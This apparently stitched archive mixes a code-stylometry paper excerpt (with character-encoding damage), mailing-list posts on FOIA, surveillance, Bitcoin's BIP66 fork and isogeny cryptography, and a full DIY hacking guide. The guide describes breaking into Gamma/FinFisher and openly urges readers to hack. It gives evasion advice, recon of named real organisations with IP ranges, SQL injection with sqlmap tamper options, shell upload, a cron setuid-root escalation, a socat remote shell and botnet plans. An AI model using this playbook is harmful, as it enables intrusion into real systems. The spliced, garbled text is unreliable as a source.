whitespace and other â€˜lexicalâ€™ features as syntax, such
as Pythonâ€™s PEP8 formatting. To show that our method
generalizes, we collected source code of 229 Python programmers from
GCJâ€™s 2014 competition. 229 programmers had exactly 9 solutions.
Using only the Python
equivalents of syntactic features listed in Table 4 and
9-fold cross-validation, the average accuracy is 53.91%
for top-1 classification, 75.69% for top-5 relaxed attribution. The
largest set of programmers to all work on
the same set of 9 problems was 23 programmers. The
average accuracy in identifying these 23 programmers is
87.93% for top-1 and 99.52% for top-5 relaxed attribution. The same
classification tasks using the information
gain features are also listed in Table 7. The overall accuracy in
datasets composed of Python code are lower
than C++ datasets. In Python datasets, we only used
syntactic features from ASTs that were generated by a
parser that was not fuzzy. The lack of quantity and specificity of
features accounts for the decreased accuracy.
The Python datasetâ€™s information gain features are significantly
fewer in quantity, compared to C++ datasetâ€™s
information gain features. Information gain only keeps
features that have discriminative value all on their own.
If two features only provide discriminative value when
used together, then information gain will discard them.
So if a lot of the features for the Python set are only
jointly discriminative (and not individually discriminative), then the
information gain criteria may be removing
features that in combination could effectively discriminate between
authors. This might account for the decrease when using information
gain features. While in
the context of other results in this paper the results in Table 7
appear lackluster, it is worth noting that even this
preliminary test using only syntactic features has comparable
performance to other prior work at a similar scale
(see Section 6 and Table 9), demonstrating the utility
of syntactic features and the relative ease of generating
them for novel programming languages. Nevertheless, a
CSFS equivalent feature set can be generated for other
Software Engineering Insights
We wanted to investigate if programming style is consistent throughout
years. We found the contestants that had
the same username and country information both in 2012
and 2014. We assumed that these are the same people but
there is a chance that they might be different people. In
2014, someone else might have picked up the same username from the
same country and started using it. We are
going to ignore such a ground truth problem for now and
assume that they are the same people.
We took a set of 25 programmers from 2012 that were
also contestants in 2014â€™s competition. We took 8 files
from their submissions in 2012 and trained a random forest classifier
with 300 trees using CSFS. We had one instance from each one of the
contestants from 2014. The
correct classification of these test instances from 2014
is 96.00%. The accuracy dropped to 92.00% when using
only information gain features, which might be due to the
aggressive elimination of pairs of features that are jointly
discriminative. These 25 programmersâ€™ 9 files from 2014
had a correct classification accuracy of 98.04%. These
results indicate that coding style is preserved up to some
degree throughout years.
To investigate problem difficultyâ€™s effect on coding
style, we created two datasets from 62 programmers that
had exactly 14 solution files. Table 8 summarizes the
following results. A dataset with 7 of the easier problems out of 14
resulted in 95.62% accuracy. A dataset
with 7 of the more difficult problems out of 14 resulted
in 99.31% accuracy. This might imply that more difficult
coding tasks have a more prevalent reflection of coding
style. On the other hand, the dataset that had 62 programmers with
exactly 7 of the easier problems resulted
in 91.24% accuracy, which is a lot lower than the accuracy obtained
from the dataset whose programmers were
able to advance to solve 14 problems. This might indicate that,
programmers who are advanced enough to answer 14 problems likely have
more unique coding styles
compared to contestants that were only able to solve the
first 7 problems.
To investigate the possibility that contestants who are
able to advance further in the rounds have more unique
coding styles, we performed a second round of experiments on
comparable datasets. We took the dataset with
12 solution files and 62 programmers. A dataset with 6
of the easier problems out of 12 resulted in 91.39% accuracy. A
dataset with 6 of the more difficult problems
out of 12 resulted in 94.35% accuracy. These results are
higher than the dataset whose programmers were only
able to solve the easier 6 problems. The dataset that had
62 programmers with exactly 6 of the easier problems
resulted in 90.05% accuracy.
that coding style is reflected more through difficult programming
tasks. This might indicate that programmers
come up with unique solutions and preserve their coding style more
when problems get harder. On the other
hand, programmers with a better skill set have a prevalent
coding style which can be identified more easily compared to
contestants who were not able to advance as
far in the competition. This might indicate that as programmers become
more advanced, they build a stronger
coding style compared to novices. There is another possibility that
maybe better programmers start out with a
more unique coding style.
Effects of Obfuscation. A malware author or plagiarizing programmer
might deliberately try to hide his
source code by obfuscation. Our experiments indicate
that our method is resistant to simple off-the-shelf obfuscators such
as stunnix, that make code look cryptic while
preserving functionality. The reason for this success is
that the changes stunnix makes to the code have no effect
on syntactic features, e.g., removal of comments, changing of names,
and stripping of whitespace.
In contrast, sophisticated obfuscation techniques such
as function virtualization hinder de-anonymization to
some degree, however, at the cost of making code
unreadable and introducing a significant performance
penalty. Unfortunately, unreadability of code is not acceptable for
open-source projects, while it is no problem
for attackers interested in covering their tracks. Developing methods
to automatically remove stylometric information from source code
without sacrificing readability
is therefore a promising direction for future research.
Limitations. We have not considered the case where
a source file might be written by a different author than
the stated contestant, which is a ground truth problem
that we cannot control. Moreover, it is often the case that
code fragments are the work of multiple authors. We
plan to extend this work to study such datasets. To shed
light on the feasibility of classifying such code, we are
currently working with a dataset of git commits to open
source projects. Our parser works on code fragments
rather than complete code, consequently we believe this
analysis will be possible.
Another fundamental problem for machine learning
classifiers are mimicry attacks. For example, our classifier may be
evaded by an adversary by adding extra
dummy code to a file that closely resembles that of another
programmer, albeit without affecting the programâ€™s
behavior. This evasion is possible, but trivial to resolve
when an analysts verifies the decision.
Finally, we cannot be sure whether the original author is actually a
Google Code Jam contestant. In this
case, we can detect those by a classify and then verify
approach as explained in Stolerman et al.â€™s work [30].
Each classification could go through a verification step

Table 8: Effect of Problem Difficulty on Coding Style
In this section, we discuss the conclusions we draw from
the experiments outlined in the previous section, limitations, as well
as questions raised by our results. In particular, we discuss the
difficulty of the different settings
considered, the effects of obfuscation, and limitations of
our current approach.
Problem Difficulty. The experiment with random
problems from random authors among seven years most
closely resembles a real world scenario. In such an experimental
setting, there is a chance that instead of only
identifying authors we are also identifying the properties
of a specific problemâ€™s solution, which results in a boost
in accuracy.
In contrast, our main experimental setting where all
authors have only answered the nine easiest problems is
possibly the hardest scenario, since we are training on the
same set of eight problems that all the authors have algorithmically
solved and try to identify the authors from
the test instances that are all solutions of the 9th problem. On the
upside, these test instances help us precisely
capture the differences between individual coding style
that represent the same functionality. We also see that
such a scenario is harder since the randomized dataset
has higher accuracy.
Classifying authors that have implemented the solution to a set of
difficult problems is easier than identifying authors with a set of
easier problems. This shows
to eliminate instances where the classifierâ€™s confidence is
below a threshold. After the verification step, instances
that do not belong to the set of known authors can be
separated from the dataset to be excluded or for further
manual analysis.
tural features to achieve higher accuracies at larger scales
and the first to study how code obfuscation affects code
There has also been some code stylometry work that
focused on manual analysis and case studies. Spafford
and Weeber [29] suggest that use of lexical features such
as variable names, formatting and comments, as well as
some syntactic features such as usage of keywords, scoping and
presence of bugs could aid in source code attribution but they do not
present results or a case study
experiment with a formal approach. Gray et al. [15]
identify three categories in code stylometry: the layout
of the code, variable and function naming conventions,
types of data structures being used and also the cyclomatic complexity
of the code obtained from the control
flow graph. They do not mention anything about the syntactic
characteristics of code, which could potentially be
a great marker of coding style that reveals the usage of
programming languageâ€™s grammar. Their case study is
based on a manual analysis of three worms, rather than
a statistical learning approach. Hayes and Offutt [16]
examine coding style in source code by their consistent
programmer hypothesis. They focused on lexical and
layout features, such as the occurrence of semicolons,
operators and constants. Their dataset consisted of 20
programmers and the analysis was not automated. They
concluded that coding style exists through some of their
features and professional programmers have a stronger
programming style compared to students. In our results
in Section 4.3.6, we also show that more advanced programmers have a
more identifying coding style.
There is also a great deal of research on plagiarism
detection which is carried out by identifying the similarities between
different programs. For example, there is a
widely used tool called Moss that originated from Stanford University
for detecting software plagiarism. Moss
[6] is able to analyze the similarities of code written by
different programmers. Rosenblum et al. [27] present a
novel program representation and techniques that automatically detect
the stylistic features of binary code.
Related Work
Our work is inspired by the research done on authorship
attribution of unstructured or semi-structured text [5, 22].
In this section, we discuss prior work on source code
authorship attribution. In general, such work (Table 9)
looks at smaller scale problems, does not use structural
features, and achieves lower accuracies than our work.
The highest accuracies in the related work are
achieved by Frantzeskou et al. [12, 14]. They used 1,500
7-grams to reach 97% accuracy with 30 programmers.
They investigated the high-level features that contribute
to source code authorship attribution in Java and Common Lisp. They
determined the importance of each feature by iteratively excluding one
of the features from the
feature set. They showed that comments, layout features
and naming patterns have a strong influence on the author
classification accuracy. They used more training
data (172 line of code on average) than us (70 lines of
code). We replicated their experiments on a 30 programmer subset of
our C++ data set, with eleven files containing 70 lines of code on
average and no comments. We
reach 76.67% accuracy with 6-grams, and 76.06% accuracy with 7-grams.
When we used a 6 and 7-gram feature set on 250 programmers with 9
files, we got 63.42%
accuracy. With our original feature set, we get 98% accuracy on 250 programmers.
The largest number of programmers studied in the related work was 46
programmers with 67.2% accuracy.
Ding and Samadzadeh [10] use statistical methods for
authorship attribution in Java. They show that among
lexical, keyword and layout properties, layout metrics
have a more important role than others which is not the
case in our analysis.
There are also a number of smaller scale, lower accuracy approaches in
the literature [9, 11, 18â€“21, 28],
shown in Table 9, all of which we significantly outperform. These
approaches use a combination of layout and
lexical features.
The only other work to explore structural features is
by Pellin [23], who used manually parsed abstract syntax
trees with an SVM that has a tree based kernel to classify
functions of two programmers. He obtains an average of
73% accuracy in a two class classification task. His approach
explained in the white paper can be extended to
our approach, so it is the closest to our work in the literature. This
work demonstrates that it is non-trivial to
use ASTs effectively. Our work is the first to use struc-

Conclusion and Future Work
[1] The tigress diversifying c virtualizer, Source code stylometry has direct applications for privacy, security,
software forensics, plagiarism, copyright infringement disputes, and
authorship verification.
Source code stylometry is an immediate concern for programmers who
want to contribute code anonymously because de-anonymization is quite
possible. We introduce
the first principled use of syntactic features along with
lexical and layout features to investigate style in source
code. We can reach 94% accuracy in classifying 1,600
authors and 98% accuracy in classifying 250 authors
with eight training files per class. This is a significant
increase in accuracy and scale in source code authorship
attribution. In particular, it shows that source code authorship
attribution with the Code Stylometry Feature Set
scales even better than regular stylometric authorship attribution, as
these methods can only identify individuals
in sets of 50 authors with slightly over 90% accuracy [see
4]. Furthermore, this performance is achieved by training
on only 550 lines of code or eight solution files, whereas
classical stylometric analysis requires 5,000 words.
Additionally, our results raise a number of questions
that motivate future research. First, as malicious code
is often only available in binary format, it would be interesting to
investigate whether syntactic features can be
partially preserved in binaries. This may require our feature set to
be improved in order to incorporate information obtained from control
flow graphs.
Second, we would also like to see if classification accuracy can be
further increased. For example, we would
like to explore whether using features that have joint information
gain alongside features that have information
gain by themselves improve performance. Moreover, designing features
that capture larger fragments of the abstract syntax tree could
provide improvements. These
changes (along with adding lexical and layout features)
may provide significant improvements to the Python results and help
generalize the approach further.
Finally, we would like to investigate whether code can
be automatically normalized to remove stylistic information while
preserving functionality and readability.

@_subject: THE BOY WHO COULD CHANGE THE WORLD: THE WRITINGS OF AARON SWARTZ by 
... In a way, Aaron is a cautionary tale for unschooling. One of the
lessons that school teaches is that the people who make the rules
don’t really have to follow them. It’s something even the most
rebellious students learn one way or another, but Aaron looked up a
different set of rules and hacked his way out of school instead. On
one hand Aaron was happy with his choice and felt more engaged and
happier with online peers, on the other he absorbed a dangerous lesson
about navigating bureaucratic systems. Plenty of legal scholars and
technology experts thought Aaron had kept on the right side of the
letter of the law, but the criminal justice system is resistant to the
kind of hacking he tended to practice. I don’t know if he considered
fleeing the country, but I doubt it. Maybe if he had lived to see
Edward Snowden make dodging extradition look good, things would have
been different.
I was surprised when I saw the security footage of Aaron entering the
MIT building, his bike helmet held half-heartedly in front of his
face, his telltale hair poking out the sides. I had read the
Manifesto, but I didn’t think it really reflected Aaron’s intentions.
I was worried about what could happen to him, but not that worried. I
figured he had enough institutional support to keep his punishment to
a slap on the wrist. Mostly I was angry that he hadn’t taken what he
was doing seriously enough; with a team and a little bit of planning,
there’s no reason the authorities should have been able to tie Aaron
to the action. But covert ops wasn’t one of his strengths, and he
never got the chance to learn.
If I’m part of the we that counted on Aaron, then I’m also part of the
we that failed him. I thought his connections and credibility and
reputation would keep him safe, and maybe he did too. Maybe we
convinced him that a boy like him could change the world, or at least
always hack an escape route. But there’s no individual who can’t be
picked off if they cross the wrong line, or just the wrong prosecutor.

that for the most of its existence was well served by not having a
public image. When the nation felt its existence was threatened, it
was willing to cut agencies like NSA quite a bit of slack. But as that
threat perception decreases, there is a natural tendency to say, "Now,
tell me again what those guys do?" And, therefore, the absence of a

"you want me to consent to make my FBI file public? Are you fucking mad?"
 - i am currently making requests through MuckRock.com which i recommend
for their helpful and dedicated staff, as well as their time devoted
to review and reporting on released information.
i am using the professional service, which lets you set requests
private until reviewed and ready to release publicly.  this implies a
bit of trust in MuckRock, and i hope it is not misplaced.
few years back i asked for participants in a similar effort. some
things resulted:
1) this also opens up the requester to risk; that is, whoever is
filing must also potentially show some trust, if a falsified DOJ-361
is sent and used as pretext to "deter" you.  i have not heard of this
actually happening, but i was also not willing to push it.
  '''beware who you accept, coder,
    or they're setting you up for USC 18 fuckery.
    sure, it may in the end be ok.
      but you're in misery until cleared.''''
2) the information is going to be public; if you've got a file because
you're a privacy enthusiast, then filing to make your file public is
the opposite of enjoying your privacy.  there is merit in taking one
for team earth human, however...

as one who is always fond of the question,
 "what's your threat model?"
the implication appears to be two fold:
1. good security journalism, aka "activist journalism", begs forth
selective and retributive prosecution through open-ended legislation
(CFAA, et. al.) as cover.
2. technical sophistication pursuing these prosecutions is now, thanks
to the cyber-industrial-complex, at a point where law enforcement uses
techniques recently considered nation state intelligence caliber.
thus to pursue "activist security journalism" that is not powers that
be sanctioned "mainstream security regurgitation" journalism,
your threat model is:
 securing yourself and your sources against
  nation state dragnet and targeted attacks,
   including tailored access and special collection.
this is currently considered a "Hard Problem" (TM)(R) even with
decades dedicated to the challenge.  i do take hope in the fact that
most earth humans are not coding to hard problems, but instead to
easy, well paying ones.  perhaps different incentives will play a

document (PDF) that could still persist in some transformations.
in other words, it depends on your threat model - who is tainting your
documents in-line, silently, without your awares,
and how complicated the formats and resulting transformations.
as another example, this is why referencing even simplified subsets of
text by a self certifying identifier, like
afb1e384e450d644703ad96cdfe9f728be509854388687eb65b7c622e2f798a9 ,
e.g. bigsundaawafn36e.onion/shid/afb/1e3/afb1e384e450d644..5b7c622e2f798a9
 or which is the same paragraph in ascii no matter PDF or Word or HTML
origin simplified to text paragraph.
then, mutually un-trusting individuals collaborating from a distance,
can use this shared address space as the base for cooperation.
if that doesn't make sense, i will explain it better, later, :)

and yes, some absolutely call home. e.g. the embedded tracking pixels and kin.
you should always load complex formats from a safe container without

these are also the most easily stripped out from a simple format
conversion, as well. (pdf2txt, etc.)

John mentioned, all the metadatas and annotations typically unseen,
consider that the specific "configuration and input parsing" as a
"profile" for a given "input document" identified by "self certifying
identifier" for all of the above results in collaborative simplified
text paragraphs as a working base.
so sha256(generated corpora) == sha256(sha256(doc)  ^ sha256(config of
parse opts) ^ sha256(parse-product) )
if i use a convenient generated slang, ...
this means at least a dozen "to text" engines with configuration,
(parse opts and parse products) per input document as a working state.
and ten to twenty times the input pages as simplified output text
paragraphs (common base) collected from the useful parts of the best
transformations, used for subsequent text based natural language
in a sense, this is devops come to document processing, where the
process itself is embodied in version controlled and complete archives
with self certifying integrity. this means boring, and also done
decades ago, more or less, in varying contexts. everything old is new
again ;P
there are a whole field of customer parser and data sets and scrapers
all dedicated to variations on this theme, although sadly they don't
live public lives, for the most part.

tractable to manage a coordinated, voluntary consensus move to
specific re-wind, specific revision, and resume.
it took exceptional circumstances - and as per thread above and long

@_subject: speaking of Bitcoin ... the july4th split 
sometimes even consensus not enough,
 [ failure at 95% agreement! ]
SPV is a compensating measure that addresses block size without
reifying incompatibilities. however, with drawbacks and risk, as taken
on chin in this one:
Summary: Some miners are currently generating invalid blocks. Almost
all software (besides Bitcoin Core 0.9.5 and later) will accept these
invalid blocks under certain conditions. The paragraphs that follow
explain the cause more throughly.
For several months, an increasing amount of mining hash rate has been
signaling its intent to begin enforcing BIP66 strict DER signatures.
As part of the BIP66 rules, once 950 of the last 1,000 blocks were
version 3 (v3) blocks, all upgraded miners would reject version 2 (v2)
Early morning UTC on 4 July 2015, the 950/1000 (95%) threshold was
reached. Shortly thereafter, a small miner (part of the non-upgraded
5%) mined an invalid block--as was an expected occurrence.
Unfortunately, it turned out that roughly half the network hash rate
was mining without fully validating blocks (called SPV mining), and
built new blocks on top of that invalid block.
Note that the roughly 50% of the network that was SPV mining had
explicitly indicated that they would enforce the BIP66 rules. By not
doing so, several large miners have lost over $50,000 dollars worth of
mining income so far.
All software that assumes blocks are valid (because invalid blocks
cost miners money) is at risk of showing transactions as confirmed
when they really aren't. This particularly affects lightweight (SPV)
wallets and software such as old versions of Bitcoin Core which have
been downgraded to SPV-level security by the new BIP66 consensus
The immediate fix, which is well underway as of this writing, is to
get all miners off of SPV mining and back to full validation (at least
temporarily). As this progresses, we will reduce our current
recommendation of waiting 30 extra confirmations to a lower number.

     A DIY Guide for those without the patience to wait for whistleblowers
--[ 1 ]-- Introduction
I'm not writing this to brag about what an 31337 h4x0r I am and what m4d sk1llz
it took to 0wn Gamma. I'm writing this to demystify hacking, to show how simple
it is, and to hopefully inform and inspire you to go out and hack shit. If you
have no experience with programming or hacking, some of the text below might
look like a foreign language. Check the resources section at the end to help you
get started. And trust me, once you've learned the basics you'll realize this
really is easier than filing a FOIA request.
--[ 2 ]-- Staying Safe
This is illegal, so you'll need to take same basic precautions:
1) Make a hidden encrypted volume with Truecrypt 7.1a [0]
2) Inside the encrypted volume install Whonix [1]
3) (Optional) While just having everything go over Tor thanks to Whonix is
   probably sufficient, it's better to not use an internet connection connected
   to your name or address. A cantenna, aircrack, and reaver can come in handy
   here.
[0] [1] As long as you follow common sense like never do anything hacking related
outside of Whonix, never do any of your normal computer usage inside Whonix,
never mention any information about your real life when talking with other
hackers, and never brag about your illegal hacking exploits to friends in real
life, then you can pretty much do whatever you want with no fear of being v&.
NOTE: I do NOT recommend actually hacking directly over Tor. While Tor is usable
for some things like web browsing, when it comes to using hacking tools like
nmap, sqlmap, and nikto that are making thousands of requests, they will run
very slowly over Tor. Not to mention that you'll want a public IP address to
receive connect back shells. I recommend using servers you've hacked or a VPS
paid with bitcoin to hack from. That way only the low bandwidth text interface
between you and the server is over Tor. All the commands you're running will
have a nice fast connection to your target.
--[ 3 ]-- Mapping out the target
Basically I just repeatedly use fierce [0], whois lookups on IP addresses and
domain names, and reverse whois lookups to find all IP address space and domain
names associated with an organization.
[0] For an example let's take Blackwater. We start out knowing their homepage is at
academi.com. Running fierce.pl -dns academi.com we find the subdomains:
67.238.84.228   email.academi.com
67.238.84.242   extranet.academi.com
67.238.84.240   mail.academi.com
67.238.84.230   secure.academi.com
67.238.84.227   vault.academi.com
54.243.51.249   Now we do whois lookups and find the homepage of  is hosted on
Amazon Web Service, while the other IPs are in the range:
NetRange:       67.238.84.224 - 67.238.84.255
CIDR:           67.238.84.224/27
CustName:       Blackwater USA
Address:        850 Puddin Ridge Rd
Doing a whois lookup on academi.com reveals it's also registered to the same
address, so we'll use that as a string to search with for the reverse whois
lookups. As far as I know all the actual reverse whois lookup services cost
money, so I just cheat with google:
"850 Puddin Ridge Rd" inurl:ip-address-lookup
"850 Puddin Ridge Rd" inurl:domaintools
Now run fierce.pl -range on the IP ranges you find to lookup dns names, and
fierce.pl -dns on the domain names to find subdomains and IP addresses. Do more
whois lookups and repeat the process until you've found everything.
Also just google the organization and browse around its websites. For example on
academi.com we find links to a careers portal, an online store, and an employee
resources page, so now we have some more:
54.236.143.203  careers.academi.com
67.132.195.12   academiproshop.com
67.238.84.236   te.academi.com
67.238.84.238   property.academi.com
67.238.84.241   teams.academi.com
If you repeat the whois lookups and such you'll find academiproshop.com seems to
not be hosted or maintained by Blackwater, so scratch that off the list of
interesting IPs/domains.
In the case of FinFisher what led me to the vulnerable finsupport.finfisher.com
was simply a whois lookup of finfisher.com which found it registered to the name
"FinFisher GmbH". Googling for:
"FinFisher GmbH" inurl:domaintools
finds gamma-international.de, which redirects to finsupport.finfisher.com
...so now you've got some idea how I map out a target.
This is actually one of the most important parts, as the larger the attack
surface that you are able to map out, the easier it will be to find a hole
somewhere in it.
--[ 4 ]-- Scanning & Exploiting
Scan all the IP ranges you found with nmap to find all services running. Aside
from a standard port scan, scanning for SNMP is underrated.
Now for each service you find running:
1) Is it exposing something it shouldn't? Sometimes companies will have services
running that require no authentication and just assume it's safe because the url
or IP to access it isn't public. Maybe fierce found a git subdomain and you can
go to git.companyname.come/gitweb/ and browse their source code.
2) Is it horribly misconfigured? Maybe they have an ftp server that allows
anonymous read or write access to an important directory. Maybe they have a
database server with a blank admin password (lol stratfor). Maybe their embedded
devices (VOIP boxes, IP Cameras, routers etc) are using the manufacturer's
default password.
3) Is it running an old version of software vulnerable to a public exploit?
Webservers deserve their own category. For any webservers, including ones nmap
will often find running on nonstandard ports, I usually:
1) Browse them. Especially on subdomains that fierce finds which aren't intended
for public viewing like test.company.com or dev.company.com you'll often find
interesting stuff just by looking at them.
2) Run nikto [0]. This will check for things like webserver/.svn/,
webserver/backup/, webserver/phpinfo.php, and a few thousand other common
mistakes and misconfigurations.
3) Identify what software is being used on the website. WhatWeb is useful [1]
4) Depending on what software the website is running, use more specific tools
like wpscan [2], CMS-Explorer [3], and Joomscan [4].
First try that against all services to see if any have a misconfiguration,
publicly known vulnerability, or other easy way in. If not, it's time to move
on to finding a new vulnerability:
5) Custom coded web apps are more fertile ground for bugs than large widely used
projects, so try those first. I use ZAP [5], and some combination of its
automated tests along with manually poking around with the help of its
intercepting proxy.
6) For the non-custom software they're running, get a copy to look at.  If it's
free software you can just download it. If it's proprietary you can usually
pirate it. If it's proprietary and obscure enough that you can't pirate it you
can buy it (lame) or find other sites running the same software using google,
find one that's easier to hack, and get a copy from them.
[0] [1] [2] [3] [4] [5] For finsupport.finfisher.com the process was:
* Start nikto running in the background.
* Visit the website. See nothing but a login page. Quickly check for sqli in the
  login form.
* See if WhatWeb knows anything about what software the site is running.
* WhatWeb doesn't recognize it, so the next question I want answered is if this
  is a custom website by Gamma, or if there are other websites using the same
  software.
* I view the page source to find a URL I can search on (index.php isn't
  exactly unique to this software). I pick Scripts/scripts.js.php, and google:
  allinurl:"Scripts/scripts.js.php"
* I find there's a handful of other sites using the same software, all coded by
  the same small webdesign firm. It looks like each site is custom coded but
  they share a lot of code. So I hack a couple of them to get a collection of
  code written by the webdesign firm.
At this point I can see the news stories that journalists will write to drum
up views: "In a sophisticated, multi-step attack, hackers first compromised a
web design firm in order to acquire confidential data that would aid them in
attacking Gamma Group..."
But it's really quite easy, done almost on autopilot once you get the hang of
it. It took all of a couple minutes to:
* google allinurl:"Scripts/scripts.js.php" and find the other sites
* Notice they're all sql injectable in the first url parameter I try.
* Realize they're running Apache ModSecurity so I need to use sqlmap [0] with
  the option --tamper='tamper/modsecurityversioned.py'
* Acquire the admin login information, login and upload a php shell [1] (the
  check for allowable file extensions was done client side in javascript), and
  download the website's source code.
[0] [1] Looking through the source code they might as well have named it Damn Vulnerable
Web App v2 [0]. It's got sqli, LFI, file upload checks done client side in
javascript, and if you're unauthenticated the admin page just sends you back to
the login page with a Location header, but you can have your intercepting proxy
filter the Location header out and access it just fine.
[0] Heading back over to the finsupport site, the admin /BackOffice/ page returns
403 Forbidden, and I'm having some issues with the LFI, so I switch to using the
sqli (it's nice to have a dozen options to choose from). The other sites by the
web designer all had an injectable print.php, so some quick requests to:
 and 1=1
 and 2=1
reveal that finsupport also has print.php and it is injectable. And it's
database admin! For MySQL this means you can read and write files. It turns out
the site has magicquotes enabled, so I can't use INTO OUTFILE to write files.
But I can use a short script that uses sqlmap --file-read to get the php source
for a URL, and a normal web request to get the HTML, and then finds files
included or required in the php source, and finds php files linked in the HTML,
to recursively download the source to the whole site.
Looking through the source, I see customers can attach a file to their support
tickets, and there's no check on the file extension. So I pick a username and
password out of the customer database, create a support request with a php shell
attached, and I'm in!

Root over 50% of linux servers you encounter in the wild with two easy scripts,
Linux_Exploit_Suggester [0], and unix-privesc-check [1].
[0] [1] finsupport was running the latest version of Debian with no local root exploits,
but unix-privesc-check returned:
WARNING: /etc/cron.hourly/mgmtlicensestatus is run by cron as root. The user
www-data can write to /etc/cron.hourly/mgmtlicensestatus
WARNING: /etc/cron.hourly/webalizer is run by cron as root. The user www-data
can write to /etc/cron.hourly/webalizer
so I add to /etc/cron.hourly/webalizer:
chown root:root /path/to/my_setuid_shell
chmod 04755 /path/to/my_setuid_shell
wait an hour, and ....nothing. Turns out that while the cron process is running
it doesn't seem to be actually running cron jobs. Looking in the webalizer
directory shows it didn't update stats the previous month. Apparently after
updating the timezone cron will sometimes run at the wrong time or sometimes not
run at all and you need to restart cron after changing the timezone. ls -l
stopped recording stats, so that's probably the issue. At any rate, the only
thing this server does is host the website, so I already have access to
everything interesting on it. Root wouldn't get much of anything new, so I move
on to the rest of the network.
--[ 6 ]-- Pivoting
The next step is to look around the local network of the box you hacked.  This
is pretty much the same as the first Scanning & Exploiting step, except that
from behind the firewall many more interesting services will be exposed. A
tarball containing a statically linked copy of nmap and all its scripts that you
can upload and run on any box is very useful for this. The various nfs-* and
especially smb-* scripts nmap has will be extremely useful.
The only interesting thing I could get on finsupport's local network was another
webserver serving up a folder called 'qateam' containing their mobile malware.
--[ 7 ]-- Have Fun
Once you're in their networks, the real fun starts. Just use your imagination.
While I titled this a guide for wannabe whistleblowers, there's no reason to
limit yourself to leaking documents. My original plan was to:
1) Hack Gamma and obtain a copy of the FinSpy server software
2) Find vulnerabilities in FinSpy server.
3) Scan the internet for, and hack, all FinSpy C&C servers.
4) Identify the groups running them.
5) Use the C&C server to upload and run a program on all targets telling them
   who was spying on them.
6) Use the C&C server to uninstall FinFisher on all targets.
7) Join the former C&C servers into a botnet to DDoS Gamma Group.
It was only after failing to fully hack Gamma and ending up with some
interesting documents but no copy of the FinSpy server software that I had to
make due with the far less lulzy backup plan of leaking their stuff while
mocking them on twitter.
Point your GPUs at FinSpy-PC+Mobile-2012-07-12-Final.zip and crack the password
already so I can move on to step 2!
--[ 8 ]-- Other Methods
The general method I outlined above of scan, find vulnerabilities, and exploit
is just one way to hack, probably better suited to those with a background in
programming. There's no one right way, and any method that works is as good as
any other. The other main ways that I'll state without going into detail are:
1) Exploits in web browers, java, flash, or microsoft office, combined with
emailing employees with a convincing message to get them to open the link or
attachment, or hacking a web site frequented by the employees and adding the
browser/java/flash exploit to that.
This is the method used by most of the government hacking groups, but you don't
need to be a government with millions to spend on 0day research or subscriptions
to FinSploit or VUPEN to pull it off. You can get a quality russian exploit kit
for a couple thousand, and rent access to one for much less. There's also
metasploit browser autopwn, but you'll probably have better luck with no
exploits and a fake flash updater prompt.
2) Taking advantage of the fact that people are nice, trusting, and helpful 95%
of the time.
The infosec industry invented a term to make this sound like some sort of
science: "Social Engineering". This is probably the way to go if you don't know
too much about computers, and it really is all it takes to be a successful
hacker [0].

*  (start at Exploit writing tutorial part 1)
*   One trick it leaves out is that on most systems the apache access log is
  readable only by root, but you can still include from /proc/self/fd/10 or
  whatever fd apache opened it as. It would also be more useful if it mentioned
  what versions of php the various tricks were fixed in.
*   Get usable reverse shells with a statically linked copy of socat to drop on
  your target and:
  target$ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp-listen:PORTNUM
  host$ socat file:`tty`,raw,echo=0 tcp-connect:localhost:PORTNUM

Aside from the hacking specific stuff almost anything useful to a system
administrator for setting up and administering networks will also be useful for
exploring them. This includes familiarity with the windows command
prompt and unix
shell, basic scripting skills, knowledge of ldap, kerberos, active directory,
networking, etc.
--[ 10 ]-- Outro
You'll notice some of this sounds exactly like what Gamma is doing. Hacking is a
tool. It's not selling hacking tools that makes Gamma evil. It's who their
customers are targeting and with what purpose that makes them evil. That's not
to say that tools are inherently neutral. Hacking is an offensive tool. In the
same way that guerrilla warfare makes it harder to occupy a country, whenever
it's cheaper to attack than to defend it's harder to maintain illegitimate
authority and inequality. So I wrote this to try to make hacking easier and more
accessible. And I wanted to show that the Gamma Group hack really was nothing
fancy, just standard sqli, and that you do have the ability to go out and take
similar action.
Solidarity to everyone in Gaza, Israeli conscientious-objectors, Chelsea
Manning, Jeremy Hammond, Peter Sunde, anakata, and all other imprisoned
hackers, dissidents, and criminals!

@_subject: [cryptography] Supersingular Isogeny DH 
References: <54C5545F.3060600 <54C92127.5060900
 <54C92732.70202 <54C9C907.5090501
 <559E13D3.8040602
it is late, and i may mis understand,
yet the two are requisite for peers arriving at a shared secret by way
of these constructed isogeny; and the random values necessary to not
give too much (confirm secret values, without exposing secret values)
i found this paper a helpful expansion on the subject:
  "In this paper, we mainly explore the efficiency of implementing recently
proposed isogeny-based post-quantum public key cryptography..."
specifically the graph on page 5. note that the key exchange relies on
finding a path connecting vertices in a graph of supersingular
isogenies - thus a pair on both ends, not just a pair arrived at among
both participants.
if this is clear as mud, i will try tomorrow on a fresh brain :)
best regards,

i don't know if you have good or bad intentions, Juan.
but i hope you know what i like about NSA is their defensive support,
and i miss the days when they weren't raving drunk with offensive
addiction pointed domestically...

to mass adoption of crypto in ways i never imagined could happen. so

you should see me in person!  my email game is just warm up...
you'll need to search the SELinux lists btw, not this one :)
actually i was thinking of code you've written for common good, but really,
 any evidence would be useful. until then, the jury's out...
some of these discourses are thought provoking, others dumb provoking,
 and yet more are just TL;DR. ;)
someone i admire is a FOIA terrorist. good friends are "privacy
extremists", and some shady fucks have sat next to me in the past.
i'm not sure what to do with this metric you're using...
no, my point about domestic surveillance is that any shred of
restraint they may have had, is now evaporated. bulk spying is always
bad, but done domestic you've gone rogue!

two points of clarification:
1. there is assumption that information is silo'ed, also cannot be shared. not!
2. the difficulty regarding SprintPCS is that their lease space spans class A's.
 see for a unique set sample across five devices for a month in a
particular configuration at a single tower. for example.
this is why the mandatory Sprint block was actually an unconventional
but exceptionally effective mitigation for this path to remote

FBI is NSA's front man for domestic programs. see DITU and how PRISM,
while an NSA program, is coordinated through FBI.
FBI does provide blanket surveillance, although they must launder
information through parallel construction before the surveillance
becomes legally actionable.
to be clear, they inspect nearly everything in-line with "Deep Packet
Inspection" and "semantic analysis" and similar techniques, e.g. Narus
Insight, at the edges rather than centrally. there is an order of
magnitude less capacity for NSANet uplink than what is monitored
through taps. they could not pull a mirror of all traffic if they
wanted to!
then, the selected stuff is collected and stored forever*. the Utah
massive data repository is not full take buffer, but rather
persistence for selected or collected information.

